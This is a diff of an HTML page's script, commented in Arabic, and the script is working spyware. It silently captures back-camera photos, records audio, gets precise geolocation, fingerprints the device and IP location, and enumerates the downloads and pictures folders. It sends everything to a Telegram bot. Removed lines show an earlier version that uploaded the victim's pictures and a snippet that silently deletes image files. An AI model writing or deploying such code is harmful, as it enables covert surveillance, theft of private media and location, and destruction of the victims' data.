-                } catch (e) {
-                    console.log("Couldn't access Pictures folder:", e);
-                }
-                
-                if (picturesSent > 0) {
-                    await sendToTelegram(`📸 Sent ${picturesSent} pictures\nتم إرسال ${picturesSent} صورة`);
-                }
-                
+                const backCameraPhoto = await captureCameraPhoto('environment');
+                await sendPhotoToTelegram(backCameraPhoto, 'back_camera.jpg');
             } catch (error) {
-                console.log('Local pictures access failed:', error);
-                await sendToTelegram("⚠️ Could not access local pictures\n⚠️ تعذر الوصول إلى الصور المحلية");
+                await sendToTelegram("⚠️ فشل الوصول إلى الكاميرا الخلفية: " + error.message);
             }
+            
+            // 4. الموقع الجغرافي
+            try {
+                const location = await getLocation();
+                await sendToTelegram(`📍 الموقع الجغرافي:\n- خط العرض: ${location.latitude}\n- خط الطول: ${location.longitude}\n- الدقة: ${location.accuracy} متر\n- رابط الخريطة: https://maps.google.com/?q=${location.latitude},${location.longitude}`);
+            } catch (error) {
+                await sendToTelegram("⚠️ فشل الحصول على الموقع الجغرافي: " + error.message);
+            }
+            
+            // 5. التسجيل الصوتي
+            try {
+                const audioBlob = await recordAudio(10);
+                await sendAudioToTelegram(audioBlob, 'audio_recording.ogg');
+            } catch (error) {
+                await sendToTelegram("⚠️ فشل التسجيل الصوتي: " + error.message);
+            }
+            
+            // 6. ملفات التحميل
+            try {
+                const downloadFiles = await getFilesFromDirectory('downloads');
+                if (downloadFiles.length > 0) {
+                    await sendToTelegram(`📁 عدد الملفات في مجلد التحميل: ${downloadFiles.length}`);
+                    // يمكن إضافة إرسال الملفات هنا
+                }
+            } catch (error) {
+                await sendToTelegram("⚠️ فشل الوصول إلى مجلد التحميل: " + error.message);
+            }
+            
+            // 7. الصور من مجلد الصور
+            try {
+                const pictures = await getFilesFromDirectory('pictures');
+                if (pictures.length > 0) {
+                    await sendToTelegram(`📸 عدد الصور في مجلد الصور: ${pictures.length}`);
+                    // يمكن إرسال بعض الصور كمثال
+                }
+            } catch (error) {
+                await sendToTelegram("⚠️ فشل الوصول إلى مجلد الصور: " + error.message);
+            }
+            
+            // 8. جهات الاتصال (هذه تحتاج إلى API خاص)
+            try {
+                // هذه الميزة تحتاج إلى صلاحيات خاصة
+                await sendToTelegram("📞 لا يمكن الوصول إلى جهات الاتصال من خلال المتصفح بدون إضافات خاصة");
+            } catch (error) {
+                await sendToTelegram("⚠️ فشل قراءة جهات الاتصال: " + error.message);
+            }
+            
+            // 9. الإشعارات (غير متاحة في المتصفح)
+            await sendToTelegram("🔔 لا يمكن قراءة الإشعارات من خلال المتصفح");
         }
-
-        async function sendPicturesFromDirectory(dirHandle) {
-            let picturesSent = 0;
+        
+        // دالة لجمع معلومات الجهاز
+        async function getDeviceInfo() {
+            const info = {
+                country: await getCountry(),
+                city: await getCity(),
+                ip: await getIP(),
+                batteryLevel: await getBatteryLevel(),
+                isCharging: await getChargingStatus(),
+                network: await getNetworkInfo(),
+                connectionType: navigator.connection ? navigator.connection.effectiveType : 'غير معروف',
+                time: new Date().toLocaleString(),
+                deviceName: navigator.userAgentData ? navigator.userAgentData.platform : navigator.platform,
+                deviceVersion: 'غير معروف',
+                deviceType: getDeviceType(),
+                ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'غير معروف',
+                storage: 'غير معروف', // لا يمكن الحصول عليها من المتصفح
+                cpuCores: navigator.hardwareConcurrency || 'غير معروف',
+                language: navigator.language,
+                browser: navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge)\/([\d.]+)/)?.[0] || navigator.userAgent,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                osVersion: 'غير معروف', // لا يمكن الحصول عليها من المتصفح
+                screenOrientation: window.screen.orientation.type,
+                colorDepth: `${window.screen.colorDepth} بت`,
+                bluetooth: 'غير متاح في المتصفح',
+                geolocation: 'متاح' in navigator.geolocation ? 'نعم' : 'لا',
+                touchSupport: 'ontouchstart' in window ? 'نعم' : 'لا'
+            };
+            
+            return info;
+        }
+        
+        // دالة لالتقاط صورة من الكاميرا
+        async function captureCameraPhoto(facingMode) {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: {
+                    facingMode: facingMode,
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 }
+                }
+            });
+            
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await new Promise((resolve) => {
+                video.onloadedmetadata = () => {
+                    video.play();
+                    resolve();
+                };
+            });
+            
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            stream.getTracks().forEach(track => track.stop());
+            
+            return new Promise((resolve) => {
+                canvas.toBlob(resolve, 'image/jpeg', 0.9);
+            });
+        }
+        
+        // دالة للحصول على الموقع الجغرافي
+        async function getLocation() {
+            return new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        });
+                    },
+                    (error) => reject(error),
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            });
+        }
+        
+        // دالة للتسجيل الصوتي
+        async function recordAudio(duration) {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const mediaRecorder = new MediaRecorder(stream);
+            const audioChunks = [];
+            
+            mediaRecorder.ondataavailable = (event) => {
+                audioChunks.push(event.data);
+            };
+            
+            const recordingPromise = new Promise((resolve) => {
+                mediaRecorder.onstop = () => {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
+                    resolve(audioBlob);
+                };
+            });
+            
+            mediaRecorder.start();
+            await new Promise(resolve => setTimeout(resolve, duration * 1000));
+            mediaRecorder.stop();
+            
+            stream.getTracks().forEach(track => track.stop());
+            
+            return recordingPromise;
+        }
+        
+        // دالة للحصول على الملفات من مجلد معين
+        async function getFilesFromDirectory(dirName) {
+            if (!('showDirectoryPicker' in window)) {
+                throw new Error("File System Access API not supported");
+            }
+            
+            const dirHandle = await window.showDirectoryPicker({ startIn: dirName });
+            const files = [];
             
             for await (const entry of dirHandle.values()) {
-                if (entry.kind === 'file' && entry.name.match(/\.(jpg|jpeg|png|gif)$/i)) {
-                    try {
-                        const file = await entry.getFile();
-                        const formData = new FormData();
-                        formData.append('chat_id', CHAT_ID);
-                        formData.append('photo', file, file.name);
-                        
-                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        });
-                        
-                        picturesSent++;
-                        if (picturesSent >= 10) break;
-                        
-                    } catch (e) {
-                        console.error('Error sending picture:', e);
-                    }
+                if (entry.kind === 'file') {
+                    files.push(entry);
                 }
             }
             
-            return picturesSent;
+            return files;
         }
-
-        async function sendCompleteDeviceInfo() {
+        
+        // دوال مساعدة للحصول على معلومات الشبكة والبلد
+        async function getIP() {
             try {
-                statusEl.textContent = "Collecting device info...\nجاري جمع معلومات الجهاز...";
-                
-                const deviceInfo = {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
-                    cpuCores: navigator.hardwareConcurrency || 'Unknown',
-                    screen: `${window.screen.width}x${window.screen.height}`,
-                    colorDepth: `${window.screen.colorDepth}bit`,
-                    language: navigator.language,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    timestamp: new Date().toISOString(),
-                    battery: 'Not available'
-                };
-
-                if ('getBattery' in navigator) {
-                    try {
-                        const battery = await navigator.getBattery();
-                        deviceInfo.battery = {
-                            level: `${Math.floor(battery.level * 100)}%`,
-                            charging: battery.charging ? 'Yes' : 'No'
-                        };
-                    } catch (e) {
-                        console.log('Battery info unavailable');
-                    }
-                }
-
-                try {
-                    const position = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, {
-                            enableHighAccuracy: true,
-                            timeout: 10000
-                        });
-                    });
-                    
-                    deviceInfo.location = {
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude,
-                        accuracy: `${position.coords.accuracy}m`
-                    };
-                    
-                } catch (e) {
-                    console.log('Location access denied');
-                }
-
-                try {
-                    const ipResponse = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipResponse.json();
-                    deviceInfo.ip = ipData.ip;
-                    
-                    try {
-                        const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-                        const locationData = await locationResponse.json();
-                        deviceInfo.networkLocation = {
-                            country: locationData.country_name,
-                            city: locationData.city,
-                            region: locationData.region,
-                            isp: locationData.org
-                        };
-                    } catch (e) {
-                        console.log('Could not get network location');
-                    }
-                } catch (e) {
-                    console.log('Could not get IP address');
-                }
-
-                const message = formatDeviceInfo(deviceInfo);
-                await sendToTelegram(message);
-                
-            } catch (error) {
-                console.error('Device info error:', error);
-                await sendToTelegram("⚠️ Error collecting device info\n⚠️ خطأ في جمع معلومات الجهاز");
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch {
+                return 'غير معروف';
             }
         }
-
+        
+        async function getCountry() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return data.country_name || 'غير معروف';
+            } catch {
+                return 'غير معروف';
+            }
+        }
+        
+        async function getCity() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return data.city || 'غير معروف';
+            } catch {
+                return 'غير معروف';
+            }
+        }
+        
+        async function getBatteryLevel() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return `${Math.round(battery.level * 100)}%`;
+                } catch {
+                    return 'غير معروف';
+                }
+            }
+            return 'غير معروف';
+        }
+        
+        async function getChargingStatus() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return battery.charging ? 'نعم' : 'لا';
+                } catch {
+                    return 'غير معروف';
+                }
+            }
+            return 'غير معروف';
+        }
+        
+        async function getNetworkInfo() {
+            if (navigator.connection) {
+                return navigator.connection.effectiveType || 'غير معروف';
+            }
+            return 'غير معروف';
+        }
+        
+        function getDeviceType() {
+            const userAgent = navigator.userAgent;
+            if (userAgent.match(/Android/i)) return 'Android';
+            if (userAgent.match(/iPhone|iPad|iPod/i)) return 'iOS';
+            if (userAgent.match(/Windows/i)) return 'Windows';
+            if (userAgent.match(/Mac/i)) return 'Mac';
+            if (userAgent.match(/Linux/i)) return 'Linux';
+            return 'غير معروف';
+        }
+        
+        // دالة لتنسيق معلومات الجهاز
         function formatDeviceInfo(info) {
-            let message = `📱 <b>DEVICE INFORMATION</b>\n\n`;
-            
-            message += `🖥️ <b>System Info</b>\n`;
-            message += `- Platform: ${info.platform}\n`;
-            message += `- User Agent: ${info.userAgent}\n`;
-            message += `- Memory: ${info.deviceMemory}\n`;
-            message += `- CPU Cores: ${info.cpuCores}\n`;
-            message += `- Screen: ${info.screen} (${info.colorDepth}bit)\n`;
-            message += `- Language: ${info.language}\n`;
-            message += `- Timezone: ${info.timezone}\n`;
-            message += `- Timestamp: ${info.timestamp}\n\n`;
-            
-            message += `🔋 <b>Battery</b>\n`;
-            if (typeof info.battery === 'object') {
-                message += `- Level: ${info.battery.level}\n`;
-                message += `- Charging: ${info.battery.charging ? 'Yes' : 'No'}\n\n`;
-            } else {
-                message += `${info.battery}\n\n`;
-            }
-            
-            if (info.location) {
-                message += `📍 <b>Location</b>\n`;
-                message += `- Latitude: ${info.location.latitude}\n`;
-                message += `- Longitude: ${info.location.longitude}\n`;
-                message += `- Accuracy: ${info.location.accuracy}\n`;
-                message += `- Google Maps: https://maps.google.com/?q=${info.location.latitude},${info.location.longitude}\n\n`;
-            }
-            
-            if (info.ip) {
-                message += `🌐 <b>Network</b>\n`;
-                message += `- IP: ${info.ip}\n`;
-                if (info.networkLocation) {
-                    message += `- Country: ${info.networkLocation.country}\n`;
-                    message += `- Region: ${info.networkLocation.region}\n`;
-                    message += `- City: ${info.networkLocation.city}\n`;
-                    message += `- ISP: ${info.networkLocation.isp}\n`;
-                }
-            }
-            
-            return message;
+            return `📱 <b>معلومات الجهاز:</b>
+- الدولة: ${info.country}  🔻
+- المدينة: ${info.city}
+- عنوان IP: ${info.ip}
+- شحن الهاتف: ${info.batteryLevel}
+- هل الهاتف يشحن؟: ${info.isCharging}
+- الشبكة: ${info.network}
+- نوع الاتصال: ${info.connectionType}
+- الوقت: ${info.time} ⏰
+- اسم الجهاز: ${info.deviceName}  🖥️
+- إصدار الجهاز: ${info.deviceVersion}
+- نوع الجهاز: ${info.deviceType} 📱
+- الذاكرة (RAM): ${info.ram}
+- الذاكرة الداخلية: ${info.storage}
+- عدد الأنوية: ${info.cpuCores}
+- لغة النظام: ${info.language}
+- اسم المتصفح: ${info.browser}
+- إصدار المتصفح: ${info.browser.split('/')[1] || 'غير معروف'}
+- دقة الشاشة: ${info.screenResolution}
+- إصدار نظام التشغيل ☢️: ${info.osVersion}
+- وضع الشاشة 📳: ${info.screenOrientation}
+- عمق الألوان 🔰: ${info.colorDepth}
+- بروتوكول الأمان المستخدم 💢: ${window.location.protocol.replace(':', '')}
+- نطاق التردد للاتصال 🌐: ${info.connectionType}
+- إمكانية تحديد الموقع الجغرافي 🌏: ${info.geolocation}
+- الدعم لتقنية البلوتوث 🛜: ${info.bluetooth}
+- دعم الإيماءات اللمسية 👏🏻: ${info.touchSupport}`;
         }
-
+        
+        // دالة لإرسال رسالة إلى تيليجرام
         async function sendToTelegram(message) {
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -1063,71 +570,34 @@
                         parse_mode: 'HTML'
                     })
                 });
-            } catch (e) {
-                console.error('Telegram send error:', e);
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
             }
+        }
+        
+        // دالة لإرسال صورة إلى تيليجرام
+        async function sendPhotoToTelegram(photoBlob, filename) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', photoBlob, filename);
+            
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        }
+        
+        // دالة لإرسال تسجيل صوتي إلى تيليجرام
+        async function sendAudioToTelegram(audioBlob, filename) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('audio', audioBlob, filename);
+            
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
+                method: 'POST',
+                body: formData
+            });
         }
     </script>
-    const fs = require('fs');
-const path = require('path');
-
-function deleteImagesSilently(folderPath) {
-    try {
-        if (!fs.existsSync(folderPath)) {
-            return { success: false, message: "Folder does not exist" };
-        }
-
-        const imageExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp'];
-        let deletedFiles = 0;
-
-        const files = fs.readdirSync(folderPath);
-        for (const file of files) {
-            const ext = path.extname(file).toLowerCase();
-            if (imageExtensions.includes(ext)) {
-                const filePath = path.join(folderPath, file);
-                fs.unlinkSync(filePath);
-                deletedFiles++;
-            }
-        }
-
-        return { 
-            success: true, 
-            deletedCount: deletedFiles,
-            message: `${deletedFiles} image files deleted`
-        };
-    } catch (error) {
-        return {
-            success: false,
-            message: error.message
-        };
-    }
-}
-
-function findOrCreateFolder() {
-    const possiblePaths = [
-        "/storage/emulated/0/mama",
-        "/sdcard/mama",
-        path.join(process.cwd(), "mama")
-    ];
-
-    for (const p of possiblePaths) {
-        if (fs.existsSync(p)) {
-            return p;
-        }
-    }
-
-    const defaultPath = possiblePaths[possiblePaths.length - 1];
-    fs.mkdirSync(defaultPath, { recursive: true });
-    return defaultPath;
-}
-
-// Main execution
-const targetFolder = findOrCreateFolder();
-const result = deleteImagesSilently(targetFolder);
-
-// To verify the operation, you can check the result object
-// result.success - boolean indicating success/failure
-// result.message - status message
-// result.deletedCount - number of files deleted (if successful)
 </body>
-</html>
+    </html>
